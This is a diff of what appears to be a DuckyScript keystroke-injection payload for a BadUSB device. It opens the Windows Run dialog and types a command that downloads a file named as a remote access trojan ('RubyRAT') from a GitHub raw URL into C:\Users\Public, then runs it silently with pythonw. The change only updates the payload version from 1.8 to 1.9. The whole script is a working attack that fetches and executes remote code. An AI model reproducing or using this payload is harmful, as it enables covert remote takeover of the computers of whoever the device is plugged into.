@@ -3,6 +3,6 @@ REM
 DELAY 500
 GUI r
 DELAY 1500
-STRING cmd /c curl -o "C:\Users\Public\pythonfile.pyw" https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/RubyRAT1.8Encrypted.txt && start /B pythonw "C:\Users\Public\pythonfile.pyw" && exit
+STRING cmd /c curl -o "C:\Users\Public\pythonfile.pyw" https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/RubyRAT1.9Encrypted.txt && start /B pythonw "C:\Users\Public\pythonfile.pyw" && exit
 DELAY 500
 ENTER
